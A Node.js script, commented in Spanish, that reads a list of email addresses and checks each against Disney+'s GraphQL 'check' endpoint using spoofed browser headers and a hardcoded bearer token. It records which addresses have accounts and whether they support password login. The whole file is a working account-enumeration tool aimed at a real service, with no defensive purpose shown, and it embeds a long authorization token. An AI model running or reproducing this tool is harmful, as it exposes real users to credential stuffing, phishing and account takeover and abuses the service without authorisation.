import fs from "fs";

// Leer emails desde archivo txt
function leerEmailsDesdeArchivo(ruta) {
    try {
        const contenido = fs.readFileSync(ruta, "utf8");
        // Filtrar líneas vacías y espacios
        return contenido.split("\n").map(line => line.trim()).filter(line => line.length > 0);
    } catch (error) {
        console.error("❌ Error leyendo archivo de emails:", error.message);
        return [];
    }
}

// Cargar emails desde el archivo
const emailsALeer = leerEmailsDesdeArchivo("./emails.txt");

if (emailsALeer.length === 0) {
    console.log("No se encontraron emails para procesar. Asegúrate de crear el archivo 'emails.txt' con un email por línea.");
    process.exit(1);
}

console.log(`Se encontraron ${emailsALeer.length} emails para procesar.\n`);

var TOKEN = "Bearer eyJ6aXAiOiJERUYiLCJraWQiOiJ0Vy10M2ZQUTJEN2Q0YlBWTU1rSkd4dkJlZ0ZXQkdXek5KcFFtOGRJMWYwIiwiY3R5IjoiSldUIiwiZW5jIjoiQzIwUCIsImFsZyI6ImRpciJ9..sP381SqPmeJ0s2Kd.OabBvRKEo0f5UnEKC5H-T6JUcAT8GziFslaJjZxWEzQwykH4tVjr6Vr_iFoZuKSn-LR_p9wkaWbl_EwhRnwzkh-i6O6rROawvlLBnzrLqEtDzBmEfOynvscwQiqdBGW7VVPxNoY_2hIzVMm5IGA6NTHBZitqfVay_mgnfaproolcgc1JfgmpOeI7rcmwmC4L1l1DaJZKHdwHX321Hj7-HPVbgNdSeq6gFABoK7wWIwhR7da2tCNcTIaTay7AKgjYGSVeE0xGP8XeB765_VATIzGAnwDJsxqyKJVFeUYfDbiKKFWqDlexUJ7AkThVivGteCLKDWBAJyPPWAB2Wdad1vLNLIcq3tF2u8U0J9nBZ5vzJTof1JnQ9LsoP3Vh3XOmogdtK2OOnDIC_VvL6uQ_J2c_0u1dVDKbpW011jpKQihuipFjMLwJEIEC1jlSpl4eMczJnx_2MSD0ta04srOmTySz9ZG4v8ZY1E5iG0KO6Llau402HMu_PObfpd3GXvapPtrmZRulCykgWjl4wP0jf97Y1kM6nx5dfgHPap2at4LH29pgJuyPTy5MRIs2qixBdQO19QJ7nG7nkl7rjrfcmMrTOyYm_E3ja_Fo4PzaQXoPg3PXav_fyO40SnAdSz792TJmnpd2fZtR02wb29CPE7bJ8kIZ0ggChwH001fO14wwKc1lshtZdeb_-uvoGqQmYSAzJ0TRdqYITwozgsfBUK-XZ9sU_i1ywaBSRzyXP5egCqhEGoSlBbwz2IeXG4WIZsB0keDfKVQo8zC3JETFSFot-D6vtxXFKXrz7I2V7Drhy1n2SjO8r4EIm_-8GmEPV3MNIeGomDFaojyF9Ct_PGHBAlmDgUU2rW1JnAagCyCK3kZSas2CVCAEOGkgni2BVfbMOxIP4kg23WX3ky9fizPdXAA1avbP7eH_jjH2wphzv9ejI2my7KsAlt3kWJM0KQTIwAUXAKOrH0LCFaPh8pS-r_VPrmaUkHl3VsZ3TB2p8LLmZpAO-o_tlTGFF9vRteSL3rI5vwAJy-gYYJrIh89d5t89EjCvSlr-4w7GNYNUoRkpvJc_HRxKnVcDY6QKN6uIG1pf3oIUJkDHs73MD_UW85fD_m9xJQoOPjvJHu8em-UDjZsgA1cqCY-ogS3XDGQ_WifuKpImittvyHmKawTXVCa8jWevW78pe-swOBqnE63xvo-9BGNJPb-nj0a8TxSzgcrNxUWWMLuEvTdmri0v4tE1C-7q63dl6DTOHTmH2BntKKjo2CaumBNZZhSf7OWFmK9nl24sii6Xe5r0QZdDVEhspthSn9vviZdcFUORICuCui8nDMzVbdJGjdBMAT2lxX7l78xv2fm_rBt4f4vj4iZHouj4-hsxU-BJVNi9gGl-cRMWolDb45TzULcCusa7PXJLxeJGvQwBmBn__IC_xK9xixq43cr9JNCXZY1pOKt4C2de4JPgP-2MZlL8j2bVJfMaFvlP5awNXiyNA_1KPWmKOqh0hqJoa5-UEyzoQ1_3ZnchAwhbR2jOi2yCC7_dihcyWOOk9krwpkGnm2BkPMYAg0MY-1gonjOf944_M1Q1Fn4M0P9qMfjdyirtZQj3WSCsSnUbF3M0Cp9PluJwKupveeXz-r69QkLoJTcr1zyCntM0vFWZ1N77ZJ4rKHCRJpyNtFlOMpUJBxAyh96vEyn9LpTuARpl_CXcyPLQtnDnoIcFMw7oiTLB0S8Ern4YPP280GdjRtKKRLY_tCh83i954bbIVD2EAGffsnshJV2D4kwrEitH2Iuqd5Ytw1mEAmwDl4QCrrmX19nN75MFFdJf9U1fA4_VOaNMKCP08fiWbIkAY-eMcn9dW3TDrWcTQEQxwAS8PAtxTEWb5WunG1j14o8NhxF1m5yTDWpbf7T1XMPBdsOR77h4uMA9W5YY7csPEQiF7lVyvzuQtgGgGDO7j7DOUmY2ZqmgCoKOz_rEAtn8YEi4yiIxyIEgNTMkBxEhxO6lhfFMlmD9kpfTT6-52TpJJXDBMkhu-JDjYx32vRkXir_fpcDYwa-29CJ9c1rObPJ7e-fEUGA1EdLw9vkDTj7NVgPeczgr0J5tDYYydH6paMiJ9ArbmOxc2ApvNY_wGpMKRYF423KndAScCGtkDULUv9NXrIZVw4nTQO9vLj_9lW3cbFtivNeN-RaeU3cXYAIkPvd0lKVwwcjGMAREzhOIsuvrpQJIfmJz1MEUDyuwmScehKApxklKhAwgWfDJloc3fOwvIqNt9PmXLnMjbB64xbWaBQXr3KZ9o7vkWoN4XUuWUwdaBAwS7YHQoBigAg6rmo_kmQwueJXDXHPZe59r2RVg30T8RQKVTgWta9XG5f-lY94bcDq5XsQ1aZ6cuOa9i0KaRKCCg9gPPS87KDBoB9-V96EemjbedhzILvDQ76LyQHY9WgezFyl80Cafqu1YS13SD4CHH4ZtVdae1s_1RTBKOGii2A2VOoT8UGAuoZQmx17-rmK89o8nCy5k4pb9THn0CRC2609nNtZ2enNscafAjc8ZwwyzoGUdIsxL8P9ZgYxfb28mMxcAzFNvrDcwJMws2nlKYiRnIQ4GhiXqMKKQia3eXLnnmQ.9dhT2OvWfUo_EuXPB8ed6w"

const rutaArchivo = "./resultados.json";
fs.writeFileSync(rutaArchivo, "[]", "utf8");

function cargarJSON() {
    try {
        const data = fs.readFileSync(rutaArchivo, "utf8");
        return JSON.parse(data);
    } catch {
        return [];
    }
}

function guardarResultado(email, result) {
    const datos = cargarJSON();
    datos.push({
        email,
        exist: result.exist,
        noError: result.noError,
        errorMessage: result.errorMessage || null
    });
    fs.writeFileSync(rutaArchivo, JSON.stringify(datos, null, 2), "utf8");
}

// Procesar cada email del archivo
for (let i = 0; i < emailsALeer.length; i++) {
    const correoFormado = emailsALeer[i];

    if (!correoFormado.includes('@')) {
        console.log(`⚠️ Línea ${i + 1} no es un email válido: ${correoFormado}`);
        continue;
    }

    var result = await checkDisneyExists(correoFormado);
    guardarResultado(correoFormado, result);

    if (result.noError) {
        if (result.exist === true) {
            console.log(correoFormado + " PERRO existeeeeeeeeeeeeeeeeeeee")
        }
        if (result.exist === false) {
            console.log((i + 1) + " no existe")
        }
    }

    if (result.noError === false) {
        if (result.serverError) {
            console.error("🖥🖥🖥🖥 Error servidor: " + result.errorMessage)
        } else {
            console.log("🌐🌐🌐🌐 Error solicitud: " + result.errorMessage);
        }
    }
}

async function checkDisneyExists(email) {
    var result = {
        noError: false,
        exist: null,
        serverError: false,
        errorMessage: ""
    }
    try {
        var serverResponse = await fetch("https://disney.api.edge.bamgrid.com/v1/public/graphql ", {
            "headers": {
                "accept": "application/json",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "priority": "u=1, i",
                "sec-ch-ua": "\"Chromium\";v=\"142\", \"Google Chrome\";v=\"142\", \"Not_A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "cross-site",
                "x-application-version": "1.1.2",
                "x-bamsdk-client-id": "disney-svod-3d9324fc",
                "x-bamsdk-platform": "javascript/windows/chrome",
                "x-bamsdk-platform-id": "browser",
                "x-bamsdk-version": "34.1",
                "x-dss-edge-accept": "vnd.dss.edge+json; version=2",
                "x-request-id": "07f43d86-8b1e-4276-a724-4ca71801239d",
                "x-request-yp-id": "624b805dafc5c73635b1a216",
                "Referer": "https://www.disneyplus.com/ ",
                "authorization": TOKEN,
            },
            "body": "{\"query\":\"\\n    query check($email: String!) {\\n        check(email: $email) {\\n            operations\\n            nextOperation\\n        }\\n    }\\n\",\"variables\":{\"email\":\"" + email + "\"},\"operationName\":\"check\"}",
            "method": "POST"
        })

        var jsonResponse = await serverResponse.json();
        if (jsonResponse.hasOwnProperty("errors")) {
            result.serverError = true;
            throw new Error(jsonResponse.errors[0].code);
        }

        if (jsonResponse.hasOwnProperty("data")) {
            if (jsonResponse.data.hasOwnProperty("check")) {
                if (jsonResponse.data.check.hasOwnProperty("operations")) {
                    if (jsonResponse.data.check.operations.includes("Login") || jsonResponse.data.check.operations.includes("OTP")) {
                        result.exist = true;
                        result.noError = true;
                        if (jsonResponse.data.check.operations.includes("Login")){
                            result.login=true
                            console.log("LOGIN")
                        }else{
                            result.login=false
                        }
                    }
                    if (jsonResponse.data.check.operations.includes("Register")) {
                        result.exist = false;
                        result.noError = true;
                    }
                }
            }
        }
        if (result.exist === null) {
            throw new Error("No se pudo determinar si existe")
        }

    } catch (error) {
        result.errorMessage = error.message;
        result.noError = false;
    } finally {
        return result
    }
}